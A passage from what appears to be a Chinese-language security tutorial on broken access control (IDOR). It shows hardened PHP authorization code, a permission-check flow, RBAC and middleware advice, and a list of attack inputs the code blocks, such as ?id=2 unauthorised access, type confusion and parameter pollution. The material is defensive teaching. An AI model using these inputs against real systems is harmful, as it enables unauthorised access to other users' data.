class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$result</span>[<span class="string">&#x27;role&#x27;</span>] : <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 获取用户ID</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">getUserId</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id FROM users WHERE user = :username&#x27;</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:username&#x27;</span>, <span class="variable">$username</span>, PDO::<span class="variable constant_">PARAM_STR</span>);</span><br><span class="line">        <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line">        <span class="variable">$result</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$result</span> ? <span class="variable">$result</span>[<span class="string">&#x27;user_id&#x27;</span>] : <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以访问用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canAccessUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取当前用户角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 管理员可以访问所有用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 普通用户只能访问自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 使用严格比较（===） ★★★</span></span><br><span class="line">        <span class="comment">// 防止类型混淆攻击</span></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以修改用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canModifyUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 只有管理员可以修改其他用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> === <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 普通用户只能修改自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> (<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 核心方法：检查是否可以删除用户 ★★★</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">canDeleteUser</span>(<span class="params"><span class="variable">$currentUser</span>, <span class="variable">$targetUserId</span></span>) </span>&#123;</span><br><span class="line">        <span class="comment">// 获取角色</span></span><br><span class="line">        <span class="variable">$role</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 只有管理员可以删除用户 ★★★</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$role</span> !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// ★★★ 管理员不能删除自己 ★★★</span></span><br><span class="line">        <span class="variable">$currentUserId</span> = <span class="built_in">self</span>::<span class="title function_ invoke__">getUserId</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> ((<span class="keyword">int</span>)<span class="variable">$targetUserId</span> === (<span class="keyword">int</span>)<span class="variable">$currentUserId</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 获取并验证用户ID ★★★</span></span><br><span class="line"><span class="variable">$userId</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>] ?? <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 输入验证 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$userId</span>) || <span class="variable">$userId</span> &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Invalid user ID&lt;/pre&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 权限检查：是否可以访问该用户 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canAccessUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$userId</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to view this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 记录未授权访问尝试 ★★★</span></span><br><span class="line">    <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized access attempt&#x27;</span>, [</span><br><span class="line">        <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">        <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$userId</span>,</span><br><span class="line">        <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>],</span><br><span class="line">        <span class="string">&#x27;timestamp&#x27;</span> =&gt; <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y-m-d H:i:s&#x27;</span>)</span><br><span class="line">    ]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 安全地查询用户信息 ★★★</span></span><br><span class="line"><span class="variable">$stmt</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">prepare</span>(<span class="string">&#x27;SELECT user_id, user, first_name, last_name, avatar FROM users WHERE user_id = :id&#x27;</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">bindParam</span>(<span class="string">&#x27;:id&#x27;</span>, <span class="variable">$userId</span>, PDO::<span class="variable constant_">PARAM_INT</span>);</span><br><span class="line"><span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$user</span> = <span class="variable">$stmt</span>-&gt;<span class="title function_ invoke__">fetch</span>(PDO::<span class="variable constant_">FETCH_ASSOC</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$user</span>) &#123;</span><br><span class="line">    <span class="comment">// ★★★ 安全地显示信息 ★★★</span></span><br><span class="line">    <span class="comment">// 使用htmlspecialchars()防止XSS</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;User Information&lt;/h2&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;User ID: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user_id&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Username: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;user&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;First Name: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;first_name&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt;Last Name: &quot;</span> . <span class="title function_ invoke__">htmlspecialchars</span>(<span class="variable">$user</span>[<span class="string">&#x27;last_name&#x27;</span>]) . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 不显示密码哈希 ★★★</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;User not found&lt;/pre&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 处理修改请求 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;update&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$updateUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;user_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查：是否可以修改该用户 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canModifyUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$updateUserId</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to modify this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized modify attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$updateUserId</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行修改...</span></span><br><span class="line">    <span class="comment">// 使用PDO预编译语句</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ★★★ 处理删除请求 ★★★</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;delete&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$deleteUserId</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;delete_id&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ★★★ 权限检查：是否可以删除该用户 ★★★</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title class_">Authorization</span>::<span class="title function_ invoke__">canDeleteUser</span>(<span class="variable">$currentUser</span>, <span class="variable">$deleteUserId</span>)) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;Access denied: You don&#x27;t have permission to delete this user&lt;/pre&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">logSecurityEvent</span>(<span class="string">&#x27;Unauthorized delete attempt&#x27;</span>, [</span><br><span class="line">            <span class="string">&#x27;user&#x27;</span> =&gt; <span class="variable">$currentUser</span>,</span><br><span class="line">            <span class="string">&#x27;target_user_id&#x27;</span> =&gt; <span class="variable">$deleteUserId</span>,</span><br><span class="line">            <span class="string">&#x27;ip&#x27;</span> =&gt; <span class="variable">$_SERVER</span>[<span class="string">&#x27;REMOTE_ADDR&#x27;</span>]</span><br><span class="line">        ]);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除...</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 生成新的CSRF token</span></span><br><span class="line"><span class="title function_ invoke__">generateSessionToken</span>();</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h3 id="完善的防护机制"><a href="#完善的防护机制" class="headerlink" title="完善的防护机制"></a>完善的防护机制</h3><p><strong>多层防御：</strong></p>
<ol>
<li><strong>认证检查</strong> - 验证用户是否登录</li>
<li><strong>CSRF Token</strong> - 防止跨站请求伪造</li>
<li><strong>角色验证</strong> - 从数据库读取真实角色</li>
<li><strong>资源所有权</strong> - 验证是否有权访问该资源</li>
<li><strong>操作权限</strong> - 不同操作有不同的权限要求</li>
<li><strong>输入验证</strong> - 验证所有输入参数</li>
<li><strong>PDO预编译</strong> - 防止SQL注入</li>
<li><strong>输出编码</strong> - htmlspecialchars()防XSS</li>
<li><strong>审计日志</strong> - 记录所有未授权访问尝试</li>
<li><strong>严格类型比较</strong> - 使用&#x3D;&#x3D;&#x3D;防止类型混淆</li>
</ol>
<p><strong>权限检查流程：</strong></p>
<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">用户请求访问user_id=2</span><br><span class="line">    ↓</span><br><span class="line">1. 检查是否登录 → 未登录则拒绝</span><br><span class="line">    ↓</span><br><span class="line">2. 验证CSRF Token → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line">3. 验证输入参数 → 无效则拒绝</span><br><span class="line">    ↓</span><br><span class="line">4. 查询当前用户角色 → 从数据库</span><br><span class="line">    ↓</span><br><span class="line">5. 检查权限：</span><br><span class="line">   <span class="bullet">-</span> <span class="string">管理员？→ 允许</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">访问自己？→ 允许</span></span><br><span class="line">   <span class="bullet">-</span> <span class="string">其他？→ 拒绝</span></span><br><span class="line">    ↓</span><br><span class="line">6. 记录访问日志</span><br><span class="line">    ↓</span><br><span class="line">7. 执行操作</span><br></pre></td></tr></table></figure>

<h3 id="为什么无法攻破？"><a href="#为什么无法攻破？" class="headerlink" title="为什么无法攻破？"></a>为什么无法攻破？</h3><p><strong>所有攻击都被阻止：</strong></p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">攻击1：?<span class="attribute">id</span>=2（越权访问）</span><br><span class="line">权限检查 → 不是管理员 &amp;&amp; 不是自己 → 拒绝</span><br><span class="line">日志记录 → 记录未授权尝试</span><br><span class="line"></span><br><span class="line">攻击2：伪造Referer</span><br><span class="line">不依赖Referer → 使用CSRF Token → 无效</span><br><span class="line"></span><br><span class="line">攻击3：类型混淆(?<span class="attribute">id</span>=2.0)</span><br><span class="line">强制类型转换 (int)<span class="variable">$userId</span> → 2</span><br><span class="line">严格比较 === → 正确验证</span><br><span class="line"></span><br><span class="line">攻击4：参数污染(?<span class="attribute">id</span>=5&amp;id=2)</span><br><span class="line">只取第一个参数 → 正常处理</span><br><span class="line"></span><br><span class="line">攻击5：会话劫持</span><br><span class="line">即使获取Session，仍需通过权限检查</span><br><span class="line"></span><br><span class="line">攻击6：修改数据库角色</span><br><span class="line">从数据库读取角色 → 如果能修改数据库，已经完全控制系统</span><br></pre></td></tr></table></figure>

<p><strong>关键防御点：</strong></p>
<ol>
<li><strong>基于角色的访问控制（RBAC）</strong> - 明确的角色和权限</li>
<li><strong>资源所有权验证</strong> - 每次都检查</li>
<li><strong>最小权限原则</strong> - 只给必要的权限</li>
<li><strong>审计和监控</strong> - 记录所有访问</li>
<li><strong>深度防御</strong> - 多层验证</li>
</ol>
<hr>
<h2 id="防御建议"><a href="#防御建议" class="headerlink" title="防御建议"></a>防御建议</h2><h3 id="架构层面"><a href="#架构层面" class="headerlink" title="架构层面"></a>架构层面</h3><h4 id="1-实施RBAC（基于角色的访问控制）"><a href="#1-实施RBAC（基于角色的访问控制）" class="headerlink" title="1. 实施RBAC（基于角色的访问控制）"></a>1. 实施RBAC（基于角色的访问控制）</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 定义角色和权限</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Permission</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VIEW_OWN_DATA</span> = <span class="string">&#x27;view_own_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">VIEW_ALL_DATA</span> = <span class="string">&#x27;view_all_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MODIFY_OWN_DATA</span> = <span class="string">&#x27;modify_own_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">MODIFY_ALL_DATA</span> = <span class="string">&#x27;modify_all_data&#x27;</span>;</span><br><span class="line">    <span class="keyword">const</span> <span class="variable constant_">DELETE_USERS</span> = <span class="string">&#x27;delete_users&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Role</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$permissions</span> = [];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">addPermission</span>(<span class="params"><span class="variable">$permission</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;permissions[] = <span class="variable">$permission</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">hasPermission</span>(<span class="params"><span class="variable">$permission</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">in_array</span>(<span class="variable">$permission</span>, <span class="variable">$this</span>-&gt;permissions);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 定义角色</span></span><br><span class="line"><span class="variable">$adminRole</span> = <span class="keyword">new</span> <span class="title class_">Role</span>();</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_ALL_DATA</span>);</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">MODIFY_ALL_DATA</span>);</span><br><span class="line"><span class="variable">$adminRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">DELETE_USERS</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$userRole</span> = <span class="keyword">new</span> <span class="title class_">Role</span>();</span><br><span class="line"><span class="variable">$userRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_OWN_DATA</span>);</span><br><span class="line"><span class="variable">$userRole</span>-&gt;<span class="title function_ invoke__">addPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">MODIFY_OWN_DATA</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 检查权限</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="variable">$currentRole</span>-&gt;<span class="title function_ invoke__">hasPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">VIEW_ALL_DATA</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Access denied&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-集中的权限检查"><a href="#2-集中的权限检查" class="headerlink" title="2. 集中的权限检查"></a>2. 集中的权限检查</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 中间件/拦截器</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AuthMiddleware</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPermission</span>(<span class="params"><span class="variable">$requiredPermission</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$currentUser</span> = <span class="title function_ invoke__">getCurrentUser</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$currentUser</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">http_response_code</span>(<span class="number">401</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Unauthorized&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$role</span> = <span class="title function_ invoke__">getUserRole</span>(<span class="variable">$currentUser</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$role</span>-&gt;<span class="title function_ invoke__">hasPermission</span>(<span class="variable">$requiredPermission</span>)) &#123;</span><br><span class="line">            <span class="title function_ invoke__">http_response_code</span>(<span class="number">403</span>);</span><br><span class="line">            <span class="title function_ invoke__">logUnauthorizedAccess</span>(<span class="variable">$currentUser</span>, <span class="variable">$requiredPermission</span>);</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Forbidden&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 使用</span></span><br><span class="line"><span class="title class_">AuthMiddleware</span>::<span class="title function_ invoke__">checkPermission</span>(<span class="title class_">Permission</span>::<span class="variable constant_">DELETE_USERS</span>);</span><br></pre></td></tr></table></figure>

<h3 id="代码层面"><a href="#代码层面" class="headerlink" title="代码层面"></a>代码层面</h3><h4 id="1-每个操作都验证权限"><a href="#1-每个操作都验证权限" class="headerlink" title="1. 每个操作都验证权限"></a>1. 每个操作都验证权限</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ❌ 错误：只在前端隐藏按钮</span></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$role</span> == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&#x27;&lt;button onclick=&quot;deleteUser()&quot;&gt;Delete&lt;/button&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ✅ 正确：在后端验证</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteUser</span>(<span class="params"><span class="variable">$userId</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">hasPermission</span>(<span class="string">&#x27;delete_users&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">UnauthorizedException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 执行删除</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-验证资源所有权"><a href="#2-验证资源所有权" class="headerlink" title="2. 验证资源所有权"></a>2. 验证资源所有权</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 查看用户资料</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">viewProfile</span>(<span class="params"><span class="variable">$userId</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$currentUserId</span> = <span class="title function_ invoke__">getCurrentUserId</span>();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 检查：是管理员 或 是用户本人</span></span><br><span class="line">    <span class="keyword">if</span> (!<span class="title function_ invoke__">isAdmin</span>() &amp;&amp; <span class="variable">$currentUserId</span> !== <span class="variable">$userId</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ForbiddenException</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 查询并返回</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="3-使用白名单"><a href="#3-使用白名单" class="headerlink" title="3. 使用白名单"></a>3. 使用白名单</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 允许的操作列表</span></span><br><span class="line"><span class="variable">$allowedActions</span> = [<span class="string">&#x27;view&#x27;</span>, <span class="string">&#x27;edit&#x27;</span>, <span class="string">&#x27;delete&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="variable">$action</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;action&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">in_array</span>(<span class="variable">$action</span>, <span class="variable">$allowedActions</span>)) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Invalid action&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

